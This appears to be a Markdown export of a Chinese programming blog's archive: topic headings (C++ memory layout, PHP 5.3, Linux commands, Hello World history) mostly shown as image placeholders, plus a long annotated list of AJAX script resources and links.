# C++ STL STRING的COPY-ON-WRITE技术

![image-20230515143940402](photo/image-20230515143940402.png)

![image-20230515144005543](photo/image-20230515144005543.png)

![image-20230515144021802](photo/image-20230515144021802.png)

# C/C++返回内部静态成员的陷阱

![image-20230515164412538](photo/image-20230515164412538.png)

# C++ 虚函数表解析

​	![image-20230515164446968](photo/image-20230515164446968.png)

![image-20230515164524578](photo/image-20230515164524578.png)

![image-20230515164544282](photo/image-20230515164544282.png)

# C++ 对象的内存布局

![image-20230515164641565](photo/image-20230515164641565.png)

![image-20230515164659249](photo/image-20230515164659249.png)

![image-20230515164719497](photo/image-20230515164719497.png)

![image-20230515164740414](photo/image-20230515164740414.png)

# JAVA EE6 初探

![image-20230515164833825](photo/image-20230515164833825.png)

# 你应该知道的20个AJAX技术(01-10)

![image-20230515165007084](photo/image-20230515165007084.png)

# 你应该知道的20个AJAX技术(11-20)

![image-20230515165043955](photo/image-20230515165043955.png)

# PHP V5.3的新鲜玩意

![image-20230515165122028](photo/image-20230515165122028.png)

![image-20230515165134636](photo/image-20230515165134636.png)

# JAVA书籍TOP 10

![image-20230515165200927](photo/image-20230515165200927.png)

# 结对编程的利与弊

![image-20230515165234064](photo/image-20230515165234064.png)

# 时间1234567890

![image-20230515165320442](photo/image-20230515165320442.png)

# 101个设计模式

![image-20230515165402369](photo/image-20230515165402369.png)

# FORK 系统炸弹

![image-20230515165420316](photo/image-20230515165420316.png)

# 如何上网觅无踪

![image-20230515165504025](photo/image-20230515165504025.png)

# 如何自己写一个网络爬虫

![image-20230515165535893](photo/image-20230515165535893.png)

# 读后感：真正编程的力量

![image-20230515165601178](photo/image-20230515165601178.png)

# 读后感：房间里的大象：GOOGLE文化成为主导

![image-20230515165706355](photo/image-20230515165706355.png)

# 资源推荐: GOOGLE CODE UNIVERSITY

![image-20230515165746257](photo/image-20230515165746257.png)

# 【引文】如何用PYTHON往GOOGLE SPREADSHEET上写数据

![image-20230515165813068](photo/image-20230515165813068.png)

# 80个优秀的AJAX方案

Ajax作为一种WEB上的技术，已经广被开发人员接受，在过去的两三年内，互联网上涌现出了很多很多的很有创意的Ajax的解决方案，令人赞叹。这里，介绍了80以上的AJAX用法以及其脚本资源，希望对你的开发有帮助。

# **Auto Complete Scripts**

1. [AJAX AutoSuggest](http://www.brandspankingnew.net/archive/2006/08/ajax_auto-suggest_auto-complete.html)

[![ajax-autosuggest1](photo/ajax-autosuggest1.png)](http://www.brandspankingnew.net/archive/2006/08/ajax_auto-suggest_auto-complete.html)



2. [AJAX Autocompleter / script.aculo.us library](http://demo.script.aculo.us/ajax/autocompleter_customized)

[![ajax-autocompleter-scriptaculous-library](photo/ajax-autocompleter-scriptaculous-library.png)](http://demo.script.aculo.us/ajax/autocompleter_customized)

3. [AJAX AutoCompleter](http://digitarald.de/playground/auto2.html)

[![ajax-autocompleter](photo/ajax-autocompleter.png)](http://digitarald.de/playground/auto2.html)

4. [Ajax autosuggest/autocomplete from database](http://www.roscripts.com/Ajax_autosuggest_autocomplete_from_database-154.html)

[![ajax-autosuggest-autocomplete-from-database](photo/ajax-autosuggest-autocomplete-from-database.png)](http://www.roscripts.com/Ajax_autosuggest_autocomplete_from_database-154.html)

5. [Ajax dynamic list](http://www.dhtmlgoodies.com/index.html?whichScript=ajax-dynamic-list)

[![ajax-dynamic-list](photo/ajax-dynamic-list.png)](http://www.dhtmlgoodies.com/index.html?whichScript=ajax-dynamic-list)

### **Instant Editor Scripts**

6. [AJAX inline text edit 2.0](http://www.yvoschaap.com/index.php/weblog/ajax_inline_instant_update_text_20/)

[![ajax-inline-text-edit-20](photo/ajax-inline-text-edit-20.png)](http://www.yvoschaap.com/index.php/weblog/ajax_inline_instant_update_text_20/)

7. [AJAX & CSS Flickr-like Editing Fields](http://dbachrach.com/blog/2007/01/07/create-flickr-like-editing-fields-using-ajax-css/)

[![ajax-css-flickr-like-editing-fields1](photo/ajax-css-flickr-like-editing-fields1.png)](http://dbachrach.com/blog/2007/01/07/create-flickr-like-editing-fields-using-ajax-css/)[
](http://delimitdesign.com/wp-content/uploads/2009/02/ajax-css-flickr-like-editing-fields.png)

8. [AJAX Instant Edit](http://www.ideasfreelance.com/lab/instant_edit/)

[![ajax-instant-edit](photo/ajax-instant-edit.png)](http://www.ideasfreelance.com/lab/instant_edit/)

### **Tab and Menu Scripts**

9. [14 Tab-Based Interface Techniques](http://www.smashingmagazine.com/2007/04/18/14-tab-based-inferface-techniques/)

[![14-tab-based-interface-techniques](photo/14-tab-based-interface-techniques.png)](http://www.smashingmagazine.com/2007/04/18/14-tab-based-inferface-techniques/)

10. [AJAX Accordion Navigation](http://demos.mootools.net/Accordion)

[![ajax-accordion-navigation1](photo/ajax-accordion-navigation1.png)](http://demos.mootools.net/Accordion)

11. [AJAX Dialogs, Menus, Grids, Trees and Views](http://extjs.com/deploy/ext/docs/)

[![ajax-dialogs-menus-grids-trees-and-views](photo/ajax-dialogs-menus-grids-trees-and-views.png)](http://extjs.com/deploy/ext/docs/)

12. [AJAX Tab Module – Closeable Implementation](http://www.nodetraveller.com/sandbox/moduleTabs/closeable.php)

[![ajax-tab-module-closeable-implementation](photo/ajax-tab-module-closeable-implementation.png)](http://www.nodetraveller.com/sandbox/moduleTabs/closeable.php)

13. [Ajax Tabs Content](http://www.dynamicdrive.com/dynamicindex17/ajaxtabscontent/)

[![ajax-tabs-content](photo/ajax-tabs-content.png)](http://www.dynamicdrive.com/dynamicindex17/ajaxtabscontent/)

14. [MooTabs – Tiny tab class for MooTools](http://www.silverscripting.com/mootabs/)

[![mootabs-tiny-tab-class-for-mootools](photo/mootabs-tiny-tab-class-for-mootools.png)](http://www.silverscripting.com/mootabs/)

15. [Dynamically loaded articles](http://www.dhtmlgoodies.com/index.html?whichScript=ajax_dynamicArticles)

[![dynamically-loaded-articles](photo/dynamically-loaded-articles.png)](http://www.dhtmlgoodies.com/index.html?whichScript=ajax_dynamicArticles)

### **Calendar/Datetime Scripts**

16. [AJAX Datetime Toolbocks – Intuitive Date Input Selection](http://datetime.toolbocks.com/)

[![ajax-datetime-toolbocks-intuitive-date-input-selection](photo/ajax-datetime-toolbocks-intuitive-date-input-selection.jpg)](http://datetime.toolbocks.com/)

17. [AJAX Calendars](http://www.ribosomatic.com/articulos/10-calendarios-con-php-css-y-javascript/)

[![ajax-calendars](photo/ajax-calendars.jpg)](http://www.ribosomatic.com/articulos/10-calendarios-con-php-css-y-javascript/)

### **Interactive Elements Scripts**

18. [AJAX Floating Windows](http://prototype-window.xilinus.com/)

[![ajax-floating-windows](photo/ajax-floating-windows.png)](http://prototype-window.xilinus.com/)

19. [AJAX Star Rating Bar](http://prototype-window.xilinus.com/)

[![ajax-star-rating-bar](photo/ajax-star-rating-bar.png)](http://delimitdesign.com/wp-content/uploads/2009/02/ajax-star-rating-bar.png)

20. [Ajax poller](http://www.dhtmlgoodies.com/index.html?whichScript=ajax-poller)

[![ajax-poller1](photo/ajax-poller1.png)](http://www.dhtmlgoodies.com/index.html?whichScript=ajax-poller)

### **Developer’s Suite Scripts**

21. [AJAX HistoryManager, Pagination](http://digitarald.de/project/historymanager/)

[![ajax-historymanager-pagination](photo/ajax-historymanager-pagination.png)](http://digitarald.de/project/historymanager/)

22. [AJAX Login System Demo](http://www.jamesdam.com/ajax_login/login.html)

[![ajax-login-system-demo](photo/ajax-login-system-demo.png)](http://www.jamesdam.com/ajax_login/login.html)

23. [AJAX image preloader](http://www.roscripts.com/Javascript_image_preloader-111.html)

[![ajax-image-preloader](photo/ajax-image-preloader1.png)](http://www.roscripts.com/Javascript_image_preloader-111.html)[
](http://delimitdesign.com/wp-content/uploads/2009/02/ajax-image-preloader.png)

24. [AJAX Tooltips: Nice Titles revised | Blog | 1976design.com](http://www.1976design.com/blog/archive/2003/11/21/nice-titles/)

[![ajax-tooltips-nice-titles-revised-blog-1976design](http://delimitdesign.com/wp-content/uploads/2009/02/ajax-tooltips-nice-titles-revised-blog-1976design1.gif)](http://www.1976design.com/blog/archive/2003/11/21/nice-titles/)

25. [40+ Tooltips Scripts With AJAX, JavaScript & CSS | Smashing Magazine](http://www.1976design.com/blog/archive/2003/11/21/nice-titles/)

[![40-tooltips-scripts-with-ajax-javascript-css-smashing-magazine](photo/40-tooltips-scripts-with-ajax-javascript-css-smashing-magazine.png)](http://delimitdesign.com/wp-content/uploads/2009/02/40-tooltips-scripts-with-ajax-javascript-css-smashing-magazine.png)

26. [AJAX Web Controls](http://www.mathertel.de/AJAXEngine/S03_AJAXControls/ConnectionsTestPage.aspx)

[![ajax-web-controls](photo/ajax-web-controls.png)](http://www.mathertel.de/AJAXEngine/S03_AJAXControls/ConnectionsTestPage.aspx)

27. [AJAX syntaxhighlighter](https://code.google.com/p/syntaxhighlighter/)

[![ajax-syntaxhighlighter](photo/ajax-syntaxhighlighter.png)](https://code.google.com/p/syntaxhighlighter/)

28. [Transparent Message](http://transparent-message.xilinus.com/)

[![transparent-message](photo/transparent-message.png)](http://transparent-message.xilinus.com/)

29. [ModalBox — An easy way to create popups and wizards](http://wildbit.com/demos/modalbox/)

[![modalbox-e28094-an-easy-way-to-create-popups-and-wizards](photo/modalbox-e28094-an-easy-way-to-create-popups-and-wizards.png)](http://wildbit.com/demos/modalbox/)

30. [Chained select boxes](http://www.dhtmlgoodies.com/index.html?whichScript=ajax_chained_select)

[![chained-select-boxes](photo/chained-select-boxes.png)](http://www.dhtmlgoodies.com/index.html?whichScript=ajax_chained_select)

31. [Fly to basket](http://www.dhtmlgoodies.com/index.html?whichScript=fly-to-basket)

[![fly-to-basket](photo/fly-to-basket.png)](http://www.dhtmlgoodies.com/index.html?whichScript=fly-to-basket)

32. [AJAX Key Events Signal](http://www.mochikit.com/examples/key_events/index.html)

[![ajax-key-events-signal](photo/ajax-key-events-signal.png)](http://www.mochikit.com/examples/key_events/index.html)

33. [Disable form submit on enter keypress](http://www.arraystudio.com/as-workshop/disable-form-submit-on-enter-keypress.html)

[![disable-form-submit-on-enter-keypress](photo/disable-form-submit-on-enter-keypress.png)](http://www.arraystudio.com/as-workshop/disable-form-submit-on-enter-keypress.html)

### **Enhanced Solutions**

34. [AJAX Instant Completion](http://www.openrico.org/demos/complex_ajax)

[![ajax-instant-completion](photo/ajax-instant-completion.png)](http://www.openrico.org/demos/complex_ajax)

35. [Novemberborn: Event Cache](http://novemberborn.net/javascript/event-cache)

[![novemberborn-event-cache](photo/novemberborn-event-cache.png)](http://novemberborn.net/javascript/event-cache)

36. [Altering CSS Class Attributes with JavaScript](http://www.shawnolson.net/a/503/altering-css-class-attributes-with-javascript.html)

[![altering-css-class-attributes-with-javascript](photo/altering-css-class-attributes-with-javascript.png)](http://www.shawnolson.net/a/503/altering-css-class-attributes-with-javascript.htm)

37. [Select Some Checkboxes JavaScript Function](http://www.shawnolson.net/a/1302/select-some-checkboxes-javascript-function.html)

[![select-some-checkboxes-javascript-function](photo/select-some-checkboxes-javascript-function.png)](http://www.shawnolson.net/a/1302/select-some-checkboxes-javascript-function.html)

38. [AJAX Emprise Charts](http://www.ejschart.com/index.php)

[![ajax-emprise-charts](photo/ajax-emprise-charts.png)](http://www.ejschart.com/index.php)

39. [amCharts: customizable flash Pie & Donut chart](http://www.amcharts.com/pie/)

[![amcharts-customizable-flash-pie-donut-chart](photo/amcharts-customizable-flash-pie-donut-chart.png)](http://www.amcharts.com/pie/)

40. [PJ Hyett : The Lightbox Effect without Lightbox](http://www.pjhyett.com/posts/190-the-lightbox-effect-without-lightbox)

[![pj-hyett-the-lightbox-effect-without-lightbox](photo/pj-hyett-the-lightbox-effect-without-lightbox.jpg)](http://www.pjhyett.com/posts/190-the-lightbox-effect-without-lightbox)

### **Forms**

41. [AJAX Upload Form](http://digitarald.de/playground/uplooad.html)

[![ajax-upload-form](photo/ajax-upload-form.png)](http://digitarald.de/playground/uplooad.html)

42. [An AJAX contact form](http://www.dustindiaz.com/ajax-contact-form/)

[![an-ajax-contact-form1](photo/an-ajax-contact-form1.png)](http://www.dustindiaz.com/ajax-contact-form/)

43. [AJAX contact form](http://www.roscripts.com/AJAX_contact_form-144.html)

[![ajax-contact-form](http://delimitdesign.com/wp-content/uploads/2009/02/ajax-contact-form.png)](http://delimitdesign.com/wp-content/uploads/2009/02/ajax-contact-form.png)

44. [Ajax.Form](http://www.roscripts.com/AJAX_contact_form-144.html)

[![ajaxform](photo/ajaxform.png)](http://delimitdesign.com/wp-content/uploads/2009/02/ajaxform.png)

45. [Ajax form validation](http://www.roscripts.com/Ajax_form_validation-152.html)

[![ajax-form-validation](photo/ajax-form-validation.png)](http://www.roscripts.com/Ajax_form_validation-152.htm)

46. [Really easy field validation](http://tetlaw.id.au/view/javascript/really-easy-field-validation)

[![really-easy-field-validation](photo/really-easy-field-validation.png)](http://tetlaw.id.au/view/javascript/really-easy-field-validation)

47. [AJAX fValidate](http://www.phil-taylor.com/fvalidate/)

[![ajax-fvalidate](photo/ajax-fvalidate.png)](http://www.phil-taylor.com/fvalidate/)

48. [Ajax newsletter form](http://www.roscripts.com/Ajax_newsletter_form-146.html)

[![ajax-newsletter-form](photo/ajax-newsletter-form.png)](http://www.roscripts.com/Ajax_newsletter_form-146.html)

49. [wForms](http://www.formassembly.com/wForms/)

[![wforms](http://delimitdesign.com/wp-content/uploads/2009/02/wforms.png)](http://www.formassembly.com/wForms/)

### **Tables and Grids**

50. [Data Grids with AJAX, DHTML and JavaScript | Smashing Magazine](http://www.smashingmagazine.com/2007/05/30/tables-and-data-grids-with-ajax-dhtml-javascript/)

[![data-grids-with-ajax-dhtml-and-javascript-smashing-magazine](photo/data-grids-with-ajax-dhtml-and-javascript-smashing-magazine.png)](http://www.smashingmagazine.com/2007/05/30/tables-and-data-grids-with-ajax-dhtml-javascript/)

51. [Grid3 Example](http://extjs.com/playpen/ext-2.0/examples/grid/grid3.html)

[![grid3-example](photo/grid3-example.png)](http://extjs.com/playpen/ext-2.0/examples/grid/grid3.html)

52. [AJAX Table Sort Script (revisited)](http://www.frequency-decoder.com/2006/09/16/unobtrusive-table-sort-script-revisited)

[![ajax-table-sort-script-revisited](photo/ajax-table-sort-script-revisited.png)](http://www.frequency-decoder.com/2006/09/16/unobtrusive-table-sort-script-revisited)

53. [AJAX Sortable Tables](http://www.mochikit.com/examples/ajax_tables/index.html)

[![ajax-sortable-tables](photo/ajax-sortable-tables.png)](http://www.mochikit.com/examples/ajax_tables/index.html)

54. [AJAX TableKit](http://www.millstream.com.au/view/code/tablekit/)

[![ajax-tablekit](photo/ajax-tablekit.png)](http://www.millstream.com.au/view/code/tablekit/)

### **Showcases, Galleries, and Lightbox Scripts**

55. [30 Scripts For Galleries, Slideshows and Lightboxes | Smashing Magazine](http://www.smashingmagazine.com/2007/05/18/30-best-solutions-for-image-galleries-slideshows-lightboxes/)

[![30-scripts-for-galleries-slideshows-and-lightboxes-smashing-magazine1](photo/30-scripts-for-galleries-slideshows-and-lightboxes-smashing-magazine1.png)](http://www.smashingmagazine.com/2007/05/18/30-best-solutions-for-image-galleries-slideshows-lightboxes/)

56. [AJAX LightBox, Sexy Box, Thick Box](http://www.nofunc.com/Sexy_Box/)

[![ajax-lightbox-sexy-box-thick-box](photo/ajax-lightbox-sexy-box-thick-box.png)](http://www.nofunc.com/Sexy_Box/)

57. [AJAX Lightbox JS](http://www.huddletogether.com/projects/lightbox/)

[![ajax-lightbox-js](photo/ajax-lightbox-js.png)](http://www.huddletogether.com/projects/lightbox)

58. [AJAX Unobtrusive Popup – GreyBox](http://orangoo.com/labs/GreyBox/)

[![ajax-unobtrusive-popup-greybox](photo/ajax-unobtrusive-popup-greybox.png)](http://orangoo.com/labs/GreyBox/)

59. [SmoothGallery: Mootools Mojo for Images | Full gallery](http://smoothgallery.jondesign.net/showcase/gallery/)

[![smoothgallery-mootools-mojo-for-images-full-gallery](photo/smoothgallery-mootools-mojo-for-images-full-gallery.png)](http://smoothgallery.jondesign.net/showcase/gallery/)

60. [AJAX Libraries and Frameworks](http://www.smashingmagazine.com/2006/11/15/ajax-dhtml-and-javascript-libraries/)

[![ajax-libraries-and-frameworks](photo/ajax-libraries-and-frameworks.png)](http://www.smashingmagazine.com/2006/11/15/ajax-dhtml-and-javascript-libraries/)

### **Animation and Visual Effects Scripts**

61. [How to Create Digg Comment Style Sliding DIVs with Javascript and CSS](http://firblitz.com/2007/3/6/re-how-to-create-digg-comment-style-sliding-divs-with-javascript-and-css)

[![how-to-create-digg-comment-style-sliding-divs-with-javascript-and-css1](photo/how-to-create-digg-comment-style-sliding-divs-with-javascript-and-css1.gif)](http://firblitz.com/2007/3/6/re-how-to-create-digg-comment-style-sliding-divs-with-javascript-and-css)

62. [How to Create a Collapsible DIV with Javascript and CSS](http://www.harrymaugans.com/2007/03/05/how-to-create-a-collapsible-div-with-javascript-and-css/)

[![how-to-create-a-collapsible-div-with-javascript-and-css1](photo/how-to-create-a-collapsible-div-with-javascript-and-css1.png)](http://www.harrymaugans.com/2007/03/05/how-to-create-a-collapsible-div-with-javascript-and-css/)

<iframe id="aswift_5" name="aswift_5" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="0" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=1001133160&amp;adf=2171351014&amp;pi=t.aa~a.425447425~i.149~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684139170&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F57.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bhRxQePR1pKO9WmDVIrgJ6TzRhYayCB-HhQJJXyhlCe9PgF69ePi4S6xuhUewcax5QUP5xf&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684141129427&amp;bpp=1&amp;bdt=23083&amp;idt=1&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D61fbd1a4204d6f0d-22794c5f46da0021%3AT%3D1677650655%3ART%3D1677650655%3AS%3DALNI_MY9K_eABMVw6xwsKnW5G_0wJN0y0Q&amp;gpic=UID%3D00000bcf61a72ea0%3AT%3D1677650655%3ART%3D1684129911%3AS%3DALNI_MbZuBf5sA5nf1llTFY7bTei5dA4cQ&amp;prev_fmts=0x0%2C1200x280%2C215x600%2C263x600&amp;nras=5&amp;correlator=5211304831097&amp;frm=20&amp;pv=1&amp;ga_vid=1380805030.1675847918&amp;ga_sid=1684140223&amp;ga_hid=1722021508&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=20224&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=17674&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C44772269%2C44782466%2C44788441%2C44792089%2C44789820&amp;oid=2&amp;pvsid=57948995142783&amp;tmod=1102801285&amp;uas=1&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F72&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=6&amp;uci=a!6&amp;btvi=3&amp;fsb=1&amp;xpc=z79ICARFrM&amp;p=https%3A//coolshell.cn&amp;dtd=12326" data-google-container-id="a!6" data-google-query-id="CMHy-tP69v4CFQqI6QUd0A0Naw" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 0px;"></iframe>

63. [How to Create an Animated, Sliding, Collapsible DIV with Javascript and CSS](http://www.harrymaugans.com/2007/03/06/how-to-create-an-animated-sliding-collapsible-div-with-javascript-and-css/)

[![how-to-create-an-animated-sliding-collapsible-div-with-javascript-and-css](http://delimitdesign.com/wp-content/uploads/2009/02/how-to-create-an-animated-sliding-collapsible-div-with-javascript-and-css.png)](http://www.harrymaugans.com/2007/03/06/how-to-create-an-animated-sliding-collapsible-div-with-javascript-and-css/)

64. [AJAX Shopcart](http://demo.script.aculo.us/shop)

[![ajax-shopcart](photo/ajax-shopcart.png)](http://demo.script.aculo.us/shop)

65. [Draggable content](http://www.dhtmlgoodies.com/index.html?showDownload=true&whichScript=dragable-content)

[![draggable-content](http://delimitdesign.com/wp-content/uploads/2009/02/draggable-content.png)](http://www.dhtmlgoodies.com/index.html?showDownload=true&whichScript=dragable-content)

66. [Dragable RSS boxes](http://www.dhtmlgoodies.com/index.html?whichScript=dragable-boxes)

[![dragable-rss-boxes](photo/dragable-rss-boxes.png)](http://www.dhtmlgoodies.com/index.html?whichScript=dragable-boxes)

67. [AJAX Pull Down Effect](http://www.openrico.org/demos?demo=pull_down)

[![ajax-pull-down-effect](http://delimitdesign.com/wp-content/uploads/2009/02/ajax-pull-down-effect.png)](http://www.openrico.org/demos?demo=pull_down)

68. [AJAX Animation Effects](http://www.openrico.org/demos?demo=effect_animation)

[![ajax-animation-effects](http://delimitdesign.com/wp-content/uploads/2009/02/ajax-animation-effects.png)](http://www.openrico.org/demos?demo=effect_animation)

69. [Combination Effects in scriptaculous wiki](http://wiki.script.aculo.us/scriptaculous/show/CombinationEffects)

[![combination-effects-in-scriptaculous-wiki](http://delimitdesign.com/wp-content/uploads/2009/02/combination-effects-in-scriptaculous-wiki.png)](http://wiki.script.aculo.us/scriptaculous/show/CombinationEffects)

70. [AJAX Motion Transition](http://demos.mootools.net/Fx.Morph)

[![ajax-motion-transition](http://delimitdesign.com/wp-content/uploads/2009/02/ajax-motion-transition.png)](http://demos.mootools.net/Fx.Morph)

### **Useful Javascript Scripts**

71. [9 Javascript(s) you better not miss!](http://www.codecoffee.com/articles/9tips.html)

[![9-javascripts-you-better-not-miss](http://delimitdesign.com/wp-content/uploads/2009/02/9-javascripts-you-better-not-miss.png)](http://www.codecoffee.com/articles/9tips.html)

72. [Top 10 custom JavaScript functions of all time](http://www.dustindiaz.com/top-ten-javascript/)

[![top-10-custom-javascript-functions-of-all-time1](http://delimitdesign.com/wp-content/uploads/2009/02/top-10-custom-javascript-functions-of-all-time1.png)](http://www.dustindiaz.com/top-ten-javascript/)

73. [Hyperdisc Materials: JavaScript: Top 10: Automatic Breadcrumb Trail](http://hyperdisc.unitec.ac.nz/materials/javascript/top10/breadcrumbs.htm)

[![hyperdisc-materials-javascript-top-10-automatic-breadcrumb-trail](http://delimitdesign.com/wp-content/uploads/2009/02/hyperdisc-materials-javascript-top-10-automatic-breadcrumb-trail.png)](http://hyperdisc.unitec.ac.nz/materials/javascript/top10/breadcrumbs.htm)

74. [JavaScript: Top 10 Most Useful JavaScripts](http://hyperdisc.unitec.ac.nz/materials/javascript/top10/)

[![javascript-top-10-most-useful-javascripts](http://delimitdesign.com/wp-content/uploads/2009/02/javascript-top-10-most-useful-javascripts.png)](http://hyperdisc.unitec.ac.nz/materials/javascript/top10/)

75. [My Favorite Javascripts for Designers: Blakems.com ?](http://www.blakems.com/archives/000087.html?_required=first_name%2CFirst+Name|last_name%2CLast+Name|emailer%2CEmail&first_name=asdad&last_name=dasdad&emailer=dasdad)

[![my-favorite-javascripts-for-designers-blakems-com](http://delimitdesign.com/wp-content/uploads/2009/02/my-favorite-javascripts-for-designers-blakems-com.png)](http://www.blakems.com/archives/000087.html?_required=first_name%2CFirst+Name|last_name%2CLast+Name|emailer%2CEmail&first_name=asdad&last_name=dasdad&emailer=dasdad)

### **More Resources and Galleries**

76. [Max Kiesler – mHub : Ajax and rails examples & how-to’s](http://www.maxkiesler.com/index.php/mhub/category/)

[![max-kiesler-mhub-ajax-and-rails-examples-how-toe28099s](http://delimitdesign.com/wp-content/uploads/2009/02/max-kiesler-mhub-ajax-and-rails-examples-how-toe28099s.png)](http://www.maxkiesler.com/index.php/mhub/category/)

77. [Ajax Resources](http://ajax.solutoire.com/)

[![ajax-resources](http://delimitdesign.com/wp-content/uploads/2009/02/ajax-resources.png)](http://ajax.solutoire.com/)

78. [DZone Snippets: Store, sort and share source code, with tag goodness](http://snippets.dzone.com/)

[![dzone-snippets-store-sort-and-share-source-code-with-tag-goodness](http://delimitdesign.com/wp-content/uploads/2009/02/dzone-snippets-store-sort-and-share-source-code-with-tag-goodness.png)](http://snippets.dzone.com/)

# LINUX 命令速查

![image-20230515170124745](photo/image-20230515170124745.png)

# 几个你可能从来没有用过的HTML标识

![image-20230515170144042](photo/image-20230515170144042.png)

# 怎样做一个 PROGRAM MANAGER

我个人认为，这是一篇不错的文章，虽然我不是Program Mananger，但是我几乎在做着和这个职位很相似的工作。在这里，我把这篇文章推荐给所有的程序员，我相信，这篇文章会让你明白，只有技术是远远不够的，因为没有Program Manager这个角色，程序员们只不过一些手中拿着利器却不知所措的散兵游勇。我希望我的导读和原文能给所有的程序带来启示。http://www.joelonsoftware.com/items/2009/03/09.html

# LINUX DISTRIBUTION TIMELINE

下面这个网站记录了整个Linux所有发行版的时间线，很有意思
http://futurist.se/gldt/

最新的更新时间是2009-2-12，下面是下载链接：
[811 kb png](http://futurist.se/gldt/gldt92.png) / [72 kb tar.bz2](http://futurist.se/gldt/gldt92.tar.bz2)

# HELLO WORLD 集中营

编程的人应该都知道什么是Hello World。这是一个最简单的程序，其只在屏幕上输出“Hello World”字样，这通常是初学者的在学习编程时的第一个示例。把打印出 “Hello World” 作为第一个范例程序，现在已经成为编程语言学习的传统。
![hello_world](photo/hello_world-150x150.png)
“Hello World”起源于Brian Kernighan 和Dennis MacAlistair Ritchie写的计算机程序设计教程《C语言程序设计》（[*The C Programming Language*](https://en.wikipedia.org/wiki/The_C_Programming_Language)）而广泛流传；但这本书并不是 “hello, world” 的滥觞，虽然这是一个普遍存在的错误认知。

这范例程序最早出现于 1972 年，由贝尔实验室成员 Brian Kernighan 撰写的内部技术文件《Introduction to the Language B》之中。不久同作者于 1974 年所撰写的《Programming in C: A Tutorial》，也延用这个范例；而以本文件扩编改写的《C语言程序设计》也保留了这个範例程式。

<iframe id="aswift_3" name="aswift_3" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=3618254820&amp;adf=3198370048&amp;pi=t.aa~a.425447425~i.3~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684135104&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F169.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bgONgx_MHxJ04i3pm0cDLEGUs_Pwg5TUJUcY8TxVSZgBs2BjzKot42N9DqI8Q9ZdLCf8tz8&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684141369790&amp;bpp=1&amp;bdt=2373&amp;idt=1&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D61fbd1a4204d6f0d-22794c5f46da0021%3AT%3D1677650655%3ART%3D1677650655%3AS%3DALNI_MY9K_eABMVw6xwsKnW5G_0wJN0y0Q&amp;gpic=UID%3D00000bcf61a72ea0%3AT%3D1677650655%3ART%3D1684129911%3AS%3DALNI_MbZuBf5sA5nf1llTFY7bTei5dA4cQ&amp;prev_fmts=0x0%2C1200x280%2C704x280&amp;nras=4&amp;correlator=5191836851216&amp;frm=20&amp;pv=1&amp;ga_vid=1380805030.1675847918&amp;ga_sid=1684140223&amp;ga_hid=2002908876&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=1171&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=0&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C31074602%2C44772268%2C44782466%2C44785295%2C44788442%2C44789779%2C44789820&a